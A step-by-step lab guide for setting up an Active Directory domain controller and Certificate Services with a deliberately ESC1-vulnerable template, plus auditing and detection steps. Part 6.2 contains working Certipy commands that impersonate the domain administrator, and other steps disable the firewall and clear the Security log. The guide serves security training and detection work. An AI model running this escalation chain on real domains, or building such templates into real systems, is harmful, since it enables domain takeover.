# Setting Up Active Directory and ADCS in a Lab Environment

Complete guide to stand up a Domain Controller and install Active Directory Certificate Services for testing ADCS attacks and defenses.

## Lab Overview

**What we're building:**
- Windows Server 2019/2022 Domain Controller
- Active Directory Domain Services (AD DS)
- Active Directory Certificate Services (AD CS)
- Vulnerable ESC1 template for testing

**Prerequisites:**
- Windows Server 2019 or 2022 ISO
- VM hypervisor (VirtualBox, VMware, Hyper-V, Proxmox)
- Minimum 4GB RAM, 2 vCPUs, 60GB disk
- Static IP configuration

## Part 1: Initial Server Setup

### 1.1 Install Windows Server

Install Windows Server with Desktop Experience (GUI).

**Post-install:**

```powershell
# Set hostname
Rename-Computer -NewName "DC01" -Restart

# Set static IP (adjust to your network)
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.10 -PrefixLength 24 -DefaultGateway 192.168.1.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 127.0.0.1,8.8.8.8

# Disable IPv6 (optional, reduces noise)
Disable-NetAdapterBinding -Name "Ethernet" -ComponentID ms_tcpip6

# Verify
Get-NetIPAddress
Get-DnsClientServerAddress
```

### 1.2 Install Required Features

```powershell
# Install AD DS and Management Tools
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Verify
Get-WindowsFeature | Where-Object {$_.Name -like "*AD-Domain*"}
```

## Part 2: Promote to Domain Controller

### 2.1 Create New Forest

```powershell
# Define domain parameters
$DomainName = "lab.local"
$DomainNetbiosName = "LAB"
$SafeModePassword = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

# Promote to DC
Install-ADDSForest `
    -DomainName $DomainName `
    -DomainNetbiosName $DomainNetbiosName `
    -SafeModeAdministratorPassword $SafeModePassword `
    -InstallDns `
    -Force
```

**The server will reboot automatically.**

### 2.2 Verify AD Installation

After reboot, log in as `LAB\Administrator`:

```powershell
# Verify AD DS
Get-ADDomain

# Verify DNS
Get-DnsServerZone

# Check FSMO roles
Get-ADDomain | Select-Object InfrastructureMaster, RIDMaster, PDCEmulator
Get-ADForest | Select-Object SchemaMaster, DomainNamingMaster

# Verify domain controller
Get-ADDomainController
```

### 2.3 Create Test Users

```powershell
# Create OUs
New-ADOrganizationalUnit -Name "LabUsers" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "LabComputers" -Path "DC=lab,DC=local"

# Create low-privilege test user
New-ADUser -Name "lowpriv" `
    -GivenName "Low" `
    -Surname "Privilege" `
    -SamAccountName "lowpriv" `
    -UserPrincipalName "lowpriv@lab.local" `
    -Path "OU=LabUsers,DC=lab,DC=local" `
    -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
    -Enabled $true

# Create high-privilege test user (Domain Admin)
New-ADUser -Name "highpriv" `
    -GivenName "High" `
    -Surname "Privilege" `
    -SamAccountName "highpriv" `
    -UserPrincipalName "highpriv@lab.local" `
    -Path "OU=LabUsers,DC=lab,DC=local" `
    -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
    -Enabled $true

Add-ADGroupMember -Identity "Domain Admins" -Members "highpriv"

# Verify
Get-ADUser -Filter * -SearchBase "OU=LabUsers,DC=lab,DC=local"
```

## Part 3: Install Active Directory Certificate Services

### 3.1 Install ADCS Role

```powershell
# Install ADCS with management tools
Install-WindowsFeature -Name AD-Certificate, ADCS-Cert-Authority, ADCS-Web-Enrollment -IncludeManagementTools

# Verify
Get-WindowsFeature | Where-Object {$_.Name -like "*ADCS*"}
```

### 3.2 Configure Certification Authority

```powershell
# Configure as Enterprise Root CA
Install-AdcsCertificationAuthority `
    -CAType EnterpriseRootCA `
    -CACommonName "LAB-CA" `
    -CADistinguishedNameSuffix "DC=lab,DC=local" `
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
    -KeyLength 2048 `
    -HashAlgorithmName SHA256 `
    -ValidityPeriod Years `
    -ValidityPeriodUnits 10 `
    -Force

# Install Web Enrollment (optional, useful for testing)
Install-AdcsWebEnrollment -Force
```

### 3.3 Verify ADCS Installation

```powershell
# Check CA status
Get-Service -Name CertSvc

# Verify CA configuration
certutil -cainfo

# Check templates
Get-CATemplate

# Open Certification Authority console
certsrv.msc
```

## Part 4: Create Vulnerable ESC1 Template (For Testing)

### 4.1 Create ESC1-Vulnerable Template

```powershell
# Get User template as base
$UserTemplate = Get-CATemplate -Name "User"

# Duplicate and configure vulnerable template
$VulnTemplate = New-Object -ComObject CertificateAuthority.CertificateTemplate
$VulnTemplate.Name = "ESC1-Vulnerable"
$VulnTemplate.DisplayName = "ESC1 Vulnerable Template"

# Set permissions manually via GUI (easier)
# Open: certtmpl.msc
```

**Manual Steps in Certificate Templates Console (`certtmpl.msc`):**

1. Right-click **User** template → **Duplicate Template**
2. **General** tab:
   - Template name: `ESC1-Vulnerable`
   - Validity period: 1 year
3. **Subject Name** tab:
   - Select **Supply in the request**
4. **Security** tab:
   - Add **Domain Users**
   - Grant: **Read**, **Enroll**, **Autoenroll**
5. **Extensions** tab:
   - Edit **Application Policies**
   - Ensure **Client Authentication** is present (default)
6. Click **OK**

### 4.2 Publish Template to CA

```powershell
# Via GUI: Open certsrv.msc
# Right-click "Certificate Templates" → New → Certificate Template to Issue
# Select "ESC1-Vulnerable" → OK

# Verify via PowerShell
certutil -CATemplates

# Or check what templates are available
Get-CATemplate | Select-Object Name, DisplayName
```

### 4.3 Verify Vulnerability

From a domain-joined client or attacker machine:

```bash
# Using Certipy (Linux/WSL)
certipy find -u lowpriv@lab.local -p 'Password123!' -dc-ip 192.168.1.10

# Look for ESC1 in output
# Should show "ESC1-Vulnerable" with ENROLLEE_SUPPLIES_SUBJECT
```

## Part 5: Enable ADCS Auditing (Detection)

### 5.1 Enable Certificate Request Auditing

```powershell
# Enable certificate services auditing
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Certification Services"

# Check that Event ID 4887 is now logged
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4887)]]" -MaxEvents 5
```

### 5.2 Configure Advanced Audit Policy

```powershell
# Enable detailed AD object access auditing
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Verify all settings
auditpol /get /category:*
```

### 5.3 Increase Security Log Size

```powershell
# Increase Security log to 512 MB (default is 20 MB)
wevtutil sl Security /ms:536870912

# Verify
wevtutil gl Security
```

## Part 6: Test ADCS Setup

### 6.1 Test Certificate Enrollment (Legitimate)

From DC or domain-joined client:

```powershell
# Request certificate as lowpriv
# Run as: lowpriv@lab.local

# Via GUI: certmgr.msc → Personal → Certificates → Request New Certificate
# Select "ESC1-Vulnerable" → Enroll

# Verify certificate
certutil -store my
```

### 6.2 Test ESC1 Attack (From Kali/Attacker)

```bash
# Install Certipy
pip3 install certipy-ad

# Enumerate vulnerable templates
certipy find -u lowpriv@lab.local -p 'Password123!' -dc-ip 192.168.1.10

# Request certificate as Administrator
certipy req -u lowpriv@lab.local -p 'Password123!' -target 192.168.1.10 -ca LAB-CA -template ESC1-Vulnerable -upn administrator@lab.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# Extract NT hash and use for PTH
```

### 6.3 Check Detection Logs

```powershell
# On DC: Check Event 4887 (Certificate Request)
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4887)]]" -MaxEvents 10 | Format-List

# Look for:
# - Requester: lowpriv
# - Subject Alternative Name: administrator@lab.local
# - Subject: CN=lowpriv (mismatch = ESC1 abuse)
```

## Part 7: Network Configuration for Testing

### 7.1 Allow Attacker Machine Access

```powershell
# Disable Windows Firewall (lab only!)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Or allow specific ports
New-NetFirewallRule -DisplayName "Allow LDAP" -Direction Inbound -LocalPort 389,636 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Allow SMB" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Allow Kerberos" -Direction Inbound -LocalPort 88 -Protocol TCP,UDP -Action Allow
New-NetFirewallRule -DisplayName "Allow RPC" -Direction Inbound -LocalPort 135 -Protocol TCP -Action Allow
```

### 7.2 DNS Configuration

Ensure attacker machine can resolve `lab.local`:

**On attacker (Linux):**
```bash
# Add to /etc/hosts
echo "192.168.1.10 dc01.lab.local lab.local" | sudo tee -a /etc/hosts

# Or set DC as DNS server
# Edit /etc/resolv.conf
nameserver 192.168.1.10
```

## Part 8: Snapshot and Cleanup

### 8.1 Take VM Snapshot

**Before testing attacks, snapshot the VM:**
- VirtualBox: `Snapshots` → `Take`
- VMware: `VM` → `Snapshot` → `Take Snapshot`
- Hyper-V: `Checkpoint`

### 8.2 Reset After Testing

```powershell
# Revoke compromised certificates
certutil -revoke <serial_number>

# Delete test certificates
certutil -delstore my <cert_thumbprint>

# Clear security logs (start fresh)
wevtutil cl Security
```

## Common Issues and Fixes

### DNS Not Resolving

```powershell
# Re-register DNS
ipconfig /registerdns
Register-DnsClient

# Restart DNS service
Restart-Service DNS
```

### ADCS Certificate Authority Not Starting

```powershell
# Check service
Get-Service CertSvc

# Restart
Restart-Service CertSvc

# Check logs
Get-EventLog -LogName Application -Source "CertificationAuthority" -Newest 20
```

### Cannot Connect from Attacker Machine

```powershell
# Verify firewall is off or rules exist
Get-NetFirewallProfile
Get-NetFirewallRule | Where-Object {$_.Enabled -eq $true}

# Test connectivity from attacker
# ping 192.168.1.10
# nmap -p 88,389,445,636 192.168.1.10
```

## Security Recommendations (Production)

**DO NOT use this setup in production. This is intentionally vulnerable.**

For production ADCS:
- ✅ Never enable `ENROLLEE_SUPPLIES_SUBJECT`
- ✅ Require Manager Approval for sensitive templates
- ✅ Enable certificate auditing (Event 4887, 4886, 4888)
- ✅ Use Tier 0 isolation for CA servers
- ✅ Regularly review certificate templates with `Certify.exe` or `Certipy`
- ✅ Monitor for SAN/Subject mismatch in requests
- ✅ Implement certificate monitoring in SIEM

## Next Steps

1. **Install Sysmon** - Use the Sysmon setup guide for enhanced logging
2. **Test ADCS attacks** - ESC1-ESC8 scenarios
3. **Build detections** - Sigma rules for Event 4887 anomalies
4. **Practice remediation** - Revoke certificates, remove vulnerable templates
5. **Snapshot everything** - Before each attack scenario

## Resources

- **ADCS Attack Guide:** https://posts.specterops.io/certified-pre-owned-d95910965cd2
- **Certipy Documentation:** https://github.com/ly4k/Certipy
- **Microsoft ADCS Docs:** https://docs.microsoft.com/windows-server/networking/core-network-guide/cncg/server-certs/install-the-certification-authority
- **ESC1-ESC13 Research:** https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53

---

**Lab complete. Now go break it (and learn how to detect it).**
